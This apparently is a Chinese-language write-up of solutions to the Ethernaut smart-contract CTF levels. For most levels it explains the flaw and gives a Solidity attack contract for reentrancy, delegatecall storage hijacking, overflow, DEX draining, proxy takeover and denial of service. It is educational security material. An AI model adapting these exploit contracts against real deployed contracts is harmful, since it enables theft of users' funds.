## 01-fallback

receive 中设置了 owner,很容易被别人以很少的转账操作转移 owner 主权，进行 withdraw
**通过方法**

- 调用 contribute()转账 1wei
- 然后直接转账 1wei 获取控制权

## 02-fallout

0.6.0 版本中，function constractName 作为构造函数，并且函数名拼错，那么就可以在外部直接调用构造函数，有风险  
**通过方法**

- 直接调用 fal1out()获取控制权

## 03-flipCoin

是用区块链的参数来进行随机数构造，那么在合约外部，就可以很容易的使用相同参数进行破解  
**通过方法**
调用 10 次 flip()即可

```solidity
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlipCoin.sol";

contract Hack {
    CoinFlip private immutable target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function _guess() private view returns(bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }

    function flip() public {
        bool guess = _guess();
        bool res = target.flip(guess);
        require(res, "guess fail");
    }
}
```

## 04-Telephone

慎用 tx.origin，msg.sender 是直接交易的发送者（可能是中间调用的合约地址），而 tx.origin 才是整个交易的最初发送者  
**通过方法**
调用 Hack 的 change()

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./Telephone.sol";

contract Hack {
    Telephone public immutable telephone;

    constructor(address _target) {
        telephone = Telephone(_target);
    }

    function change() public {
        telephone.changeOwner(msg.sender);
    }
}
```

## 05-Token

0.6.0 版本的 solidity 没有溢出检查，所以 uint 类型，0-1 的话会是一个很大的正数，永远不可能为 0  
**通过方法**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IToken{
    function transfer(address _to, uint _value) external returns (bool);

  function balanceOf(address _owner) external view returns (uint);

}

contract Hack {
    constructor(address _target) {
        IToken(_target).transfer(msg.sender, 1);
    }
}
```

## 06-delegation

delegatcall 调用其他合约函数，会修改当前合约的状态变量，解决方法是在 delegation 中调用 fallback 调用 pwn，atAddress 部署 delegate

## 07-force

selfdestruct(address ), 销毁当前合约，并将销毁合约的账户余额转移到制定账户

```solidity
contract Hack{
    constructor(address payable _target) payable{
        selfdestruct(_target);
    }
}
```

## 08-vault

状态变量设置成 private 不是说就完全不能获取了，可以使用 ethers.js 等通过 storage 指定的 slot 中获取  
await web3.eth.getStorageAt(contract.address, 1)

## 09-king

使用 transfer 进行转账，如果对一个没有 receive 和 fallback 的合约进行转账，很容易转账失败，导致后面的服务不能生效，遭受 DOS 攻击

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./King.sol";

contract Hack {
    King public immutable king;

    constructor(address payable _target) payable{
        king = King(_target);
    }

    function hack() public payable{
        (bool success,) = address(king).call{value: king.prize()}("");
        require(success, "pay failed!");
    }
}
```

## 10-Re-entrancy

就是连续发两次转账请求，都可以转账给我，因为判断条件的状态变量还没来得及更新。 withdraw 一次，然后在 hack 合约的 receive 中再次 withdraw

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IReentrance.sol";

contract Hack {
    IReentrance private re;

    function hack(address _target) public {
        re = IReentrance(_target);
        IReentrance(_target).withdraw(1000000000000000);

    }

    receive() external payable{
        re.withdraw(1000000000000000);
    }
}
```

## 11-elevator

使用接口来接受地址，调用传递进来地址对应合约的方法，这样方法的逻辑本合约内不可控，容易出现意外被攻击

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Hack {
    bool entried;
    Elevator private immutable elevator;

    constructor(address _target) {
        elevator = Elevator(_target);
    }
    function isLastFloor(uint) external returns (bool){

        if(entried) {
            return true;
        } else {
            entried = true;
            return false;
        }
    }

    function hack() public {
        elevator.goTo(3);
    }
}
```

## 12-privacy

private 数组中的元素也是可以通过 slot 获取的  
await web3.eth.getStorageAt(contract.address, 5)

## 13-gatekeeperOne

msg.sender != tx.origin，需要借助合约攻击；  
uint32(k) ！= uint64(k), 构造的 64 位数，高位要和 32 位不同，但是 uint16 是根据 tx.origin 推算的;  
gas 剩余要能被 8191 整除，所以交易带的 gas 要是 8191 的整数倍+消耗的 gas，消耗的 gas 通过测试调试一下,这关是 256

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./GateKeeperOne.sol";

contract HackOne{

    GatekeeperOne  private immutable gateKeeperOne;

    constructor(address _target) {
        gateKeeperOne = GatekeeperOne (_target);
    }

    function hack(uint256 gas) external {
        bytes8 gateKey;

        gateKey = bytes8(uint64(1<<63) + uint64(uint16(uint160(tx.origin))));

        require(gateKeeperOne.enter{gas: 8191 * 3 + gas}(gateKey), "failed!");
    }
}
```

## 14-gatekeeperTwo

extcodesize(caller()) == 0, 这个要求 msg.sender 不能是有其他代码的合约，可以通过在 constructor 中执行必要的 code 规避这个检查

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGateKeeperTwo {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Hack {
    constructor(IGateKeeperTwo target) {
       bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        require(target.enter(key), "failed");
    }
}
```

## 15-NaughtCoin

漏洞就是它本身是个 ERC20，且对外只提供了 transfer，我们可以使用 ERC20 接口来获取合约实例，approve 一下 hack 合约可以转走自己的 token,在 hack 中调用 transferFrom 转走。使用接口获取合约对于原合约中没有对接口有自己的多重保护是个大风险，所以在使用接口时，要考虑全面，对每个接口函数最好都有自己的防范措施。

```solidity
// SDPX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract Hack {
    function hack(address _target) public {
        IERC20 naughtCoin = IERC20(_target);
        uint256 balance = naughtCoin.balanceOf(msg.sender);
        naughtCoin.transferFrom(msg.sender, address(this), balance);
    }
}
```

## 16-Preservation

delegatecall 修改的是和调用合约相同 slot 位置的状态变量，一个不小心就会被利用修改所有权

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Preservation.sol";

contract Hack {
    // stores a timestamp
  uint storedTime;
  uint stored2Time;
  address owner;

  function hack(address _target) public {
      Preservation p = Preservation(_target);
      p.setFirstTime(uint256(uint160(address(this))));
      p.setFirstTime(uint256(uint160(msg.sender)));
  }

  function setTime(uint _time) public {
    owner = address(uint160(_time));
  }
}
```

## 17-Recovery

获取合约的地址：

```solidity
function addressFrom(address _origin, uint _nonce) public pure returns (address) {
    bytes memory data;
    if (_nonce == 0x00)          data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, bytes1(0x80));
    else if (_nonce <= 0x7f)     data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, uint8(_nonce));
    else if (_nonce <= 0xff)     data = abi.encodePacked(bytes1(0xd7), bytes1(0x94), _origin, bytes1(0x81), uint8(_nonce));
    else if (_nonce <= 0xffff)   data = abi.encodePacked(bytes1(0xd8), bytes1(0x94), _origin, bytes1(0x82), uint16(_nonce));
    else if (_nonce <= 0xffffff) data = abi.encodePacked(bytes1(0xd9), bytes1(0x94), _origin, bytes1(0x83), uint24(_nonce));
    else                         data = abi.encodePacked(bytes1(0xda), bytes1(0x94), _origin, bytes1(0x84), uint32(_nonce));
    return address(uint160(uint256(keccak256(data))));
}
```

需要试一下 nonce，这一关应该刚发送交易，猜测 0x80 或者 0x01,这关是 0x01

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Hack {
    function guessAddress(address sender) public pure returns(address){
        // address data = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x80))))));

        address data = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01))))));
        return data;
    }
}
```

## 18-MagicNumber

solidity by example 使用 bytecode 的合约：https://solidity-by-example.org/app/simple-bytecode-contract/  
创建一个返回 42 的合约

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./MagicNumber.sol";

contract Hack {
    // function whatIsTheMeaningOfLife() external pure returns(uint) {
         // return 42;
    // }

    constructor(MagicNum magicAddress){
        address solverAddr;
        bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
        assembly {
            // create(value, offset, size)
            solverAddr := create(0, add(bytecode, 0x20), 0x13) //前32位存长度，从+32位位置定位到bytecode
        }
        require(solverAddr != address(0));
        magicAddress.setSolver(solverAddr);
    }
}

/*
Run time code - return 42
602a60005260206000f3

// Store 42 to memory
mstore(p, v) - store v at memory p to p + 32

PUSH1 0x2a
PUSH1 0
MSTORE

// Return 32 bytes from memory
return(p, s) - end execution and return data from memory p to p + s

PUSH1 0x20
PUSH1 0
RETURN

Creation code - return runtime code
69602a60005260206000f3600052600a6016f3

// Store run time code to memory
PUSH10 0X602a60005260206000f3
PUSH1 0
MSTORE

// Return 10 bytes from memory starting at offset 22
PUSH1 0x0a
PUSH1 0x16
RETURN
*/
```

## 19-AlienCodex

主合约继承了 ownable 合约，在主合约中，第一个隐藏的状态变量应该是 ownable 中的 owner，目标是把第一个状态变量赋值成 msg.sender  
一个合约中 slot 总数 2^256 个，当使用的 slot 数超过 2^256 时，会复写之前的 slot  
合约中数组长度变化没有溢出处理，很容易被修改数组长度；尽量使用固定长度的数组，或者做好防溢出处理

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IAlienCodex{
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
    function owner() external view returns(address);
}

contract Hack {
    function hack(IAlienCodex target) external {
        target.makeContact();
        target.retract();  // codex.length = 2^256 -1

        uint256 codexFirstSlot = uint256(keccak256(abi.encode(1)));
        uint index;
        unchecked{
            index = 0 - codexFirstSlot;
        }

        target.revise(index, bytes32(uint256(uint160(msg.sender))));

    }
}
```

## 20-Denial

使用 call 进行转账时，没有去验证转账结果，所以转账成功或者失败都会进行下一步操作，因此要想不进入下一步操作，就需要在上一步消耗掉所有的 gas。使用 while 无限循环，这样上一步消耗完所有的 gas，那么下一步自然就不能执行。

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Denial.sol";
contract Hack {
    function hack(Denial target) external {
        target.setWithdrawPartner(address(this));
        target.withdraw();
    }

    receive() external payable{
        while(true){

        }
    }
}
```

## 21-shop

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Shop.sol";

contract Hack{

    Shop private shop;
    constructor(address target){
        shop = Shop(target);
    }

    function hack() external {
        shop.buy();
    }

    function price() external view returns(uint){
        if(shop.isSold()) {
            return 80;
        } else {
            return 101;
        }
    }


}
```

## 21-Dex

根据交换的数量算法，推算不停交换代币，经过几轮可以将 Dex 中的一种代币全部转出

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IDex{
    function token1() external view returns(address);
    function token2() external view returns(address);
    function swap(address from, address to, uint amount) external;
    function getSwapPrice(address from, address to, uint amount) external view returns(uint);
    function approve(address spender, uint amount) external;

}

interface IERC20{
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

contract Hack {

    IDex private dex;
    IERC20 private token1;
    IERC20 private token2;

    constructor(address target){
        dex = IDex(target);
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function hack() external {

        token1.transferFrom(msg.sender, address(this), 10);

        token2.transferFrom(msg.sender, address(this), 10);

        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

//    10 10 100 100
        dex.swap(address(token1), address(token2), token1.balanceOf(address(this)));
// //    0. 20 110 90
        dex.swap(address(token2), address(token1), token2.balanceOf(address(this)));
// //    24  0 86  110
        dex.swap(address(token1), address(token2), token1.balanceOf(address(this)));
// //    0  30 110 80
        dex.swap(address(token2), address(token1), token2.balanceOf(address(this)));
// //    41 0   69  110
        dex.swap(address(token1), address(token2), token1.balanceOf(address(this)));
// //    0。 65 110  45
        dex.swap(address(token2), address(token1), token2.balanceOf(address(this)));
// //    110 25 0   110
        dex.swap(address(token1), address(token2), token1.balanceOf(address(this)));
// //   110 = x*110/45. x=45
        dex.swap(address(token2), address(token1), 45);

        require(token1.balanceOf(address(dex)) == 0, "dex fail");
    }

}
```

## 22-Dex2

交换的时候没有检查 token 类型，所以可以利用第三个 token 去交换出现有的所有 token

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";


interface IDEX2{

    function token1() external view returns(address);
    function token2() external view returns(address);
    function add_liquidity(address token_address, uint amount) external;
    function swap(address from, address to, uint amount) external;
}

contract token3 is ERC20{
    constructor() ERC20("Token3", "TK3") {
        _mint(msg.sender, 100);
    }

}

contract Hack {
    IDEX2 private idex2;
    IERC20 private token1;
    IERC20 private token2;
    IERC20 private token3;

    constructor(address target, address _token3) {
        idex2 = IDEX2(target);
        token1 = IERC20(idex2.token1());
        token2 = IERC20(idex2.token2());
        token3 = IERC20(_token3);
    }

    function hack() external {
        token3.transferFrom(msg.sender, address(this), 100);
        token3.approve(address(idex2), 100);
        token3.transferFrom(address(this), address(idex2), 1);
        idex2.swap(address(token3), address(token1), 1);
        idex2.swap(address(token3), address(token2), 2);
    }


}
```

## 23-Puzzle Wallet

proxy 合约和 wallet 合约，proxy 中和 wallet 同 slot 的变量应该是一致的，所以对 proxy 中变量的修改会影响 wallet 中的使用，对 wallet 中的逻辑调用会影响 proxy 中的变量值  
multicall 连续两次调用

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Puzzle{
    function admin() external view returns(address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Hack{
    Puzzle private puzzle;

    constructor(address _target) {
        puzzle = Puzzle(_target);

    }

    function hack() external payable{
        puzzle.proposeNewAdmin(address(this));
        puzzle.addToWhitelist(address(this));

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(puzzle.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSelector(puzzle.multicall.selector, deposit_data);

        puzzle.multicall{value: msg.value}(data);

        puzzle.execute(msg.sender, 0.002 ether, "");

        puzzle.setMaxBalance(uint256(uint160(msg.sender)));

    }
}
```

## 24-MotorBike

可以通过代理合约中存放 engine 合约的 slot 获取 engine 合约地址
engine 合约中 initial 方法 的 modifier 没有定义，谁都可以调用修改 upgrader  
engine 合约中更新合约部分使用 delegatecall, 新合约中存在 selfdesructor 的话，engine 也会执行这个逻辑自毁

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface MotorBike{
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Hack {
    // engine contract 0xAa6F4d8305deE2cd0A38173D1338eD54f6BCfaD6

    MotorBike private motorBike;

    constructor(address target) {
        motorBike = MotorBike(target);
    }

    function hack() external {
        motorBike.initialize();
        motorBike.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destruct.selector));
    }

    function destruct() external {
        selfdestruct(payable(msg.sender));
    }

}
```

## 25-GoodSamaritan

转账方是合约的话会调用一个 notify，但是这个 notify 的实现依赖调用的合约，有风险

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGood{
    function coin() external view returns(address);
    function wallet() external view returns(address);
    function requestDonation() external returns(bool enoughBalance);
}

interface ICoin{
    function balances(address) external view returns(uint256);
}

contract Hack {
    IGood private good;
    error NotEnoughBalance();

    constructor (address target) {
        good = IGood(target);
    }

    function hack() external {
        good.requestDonation();
    }

    function notify(uint256 amount) external {
        if(amount == 10) {
            revert NotEnoughBalance();
        }

    }
}
```

## 26-Gatekeeper three

直接调用方法修改 owner，使用中间合约可以保证 tx.orign 和 msg.sender 不同  
password=block.timestamp, 创建 trick 并同时传入 block.timestamp  
send ethers

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract Hack{
    GatekeeperThree private gatekeeper3;

    constructor(address payable target) {
        gatekeeper3 = GatekeeperThree(target);
    }

    function hack() external payable{
        gatekeeper3.construct0r();

        gatekeeper3.createTrick();
        gatekeeper3.getAllowance(block.timestamp);

        //0.001000000000000001
        (bool success,) = address(gatekeeper3).call{value: msg.value}("");
        require(success, "transfer ether failed!");
        gatekeeper3.enter();

    }
}
```
